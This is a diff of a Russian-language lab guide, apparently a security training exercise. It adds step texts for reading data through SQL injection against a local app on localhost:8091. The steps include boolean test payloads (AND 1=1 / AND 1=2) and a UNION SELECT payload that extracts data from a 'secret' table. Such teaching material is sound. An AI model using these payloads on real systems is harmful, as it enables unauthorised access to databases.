@@ -190,17 +190,17 @@ User webUser = mapper.readValue(byteSession, User.class);
 3. Перейдите на страницу новости. _Как формируется URL?_
 
 #### Часть 2. Чтение данных с помощью SQL-инъекции
-1.
+1. Добавьте в URL __AND 1=1__. _Как изменился SQL-запрос к БД?_
 ```
 http://localhost:8091/1 AND 1=1
 http://localhost:8091/1%20AND%201=1
 ```
-2.
+2. Добавьте в URL __AND 1=2__. _Что произошло?_
 ```
 http://localhost:8091/1 AND 1=2
 http://localhost:8091/1%20AND%201=2
 ```
-3.
+3. С использованием SQL-инъекции извлеките данные из другой таблицы:
 ```
 http://localhost:8091/-1 UNION SELECT 1,id,val from secret
 http://localhost:8091/-1%20UNION%20SELECT%201,id,val%20from%20secret
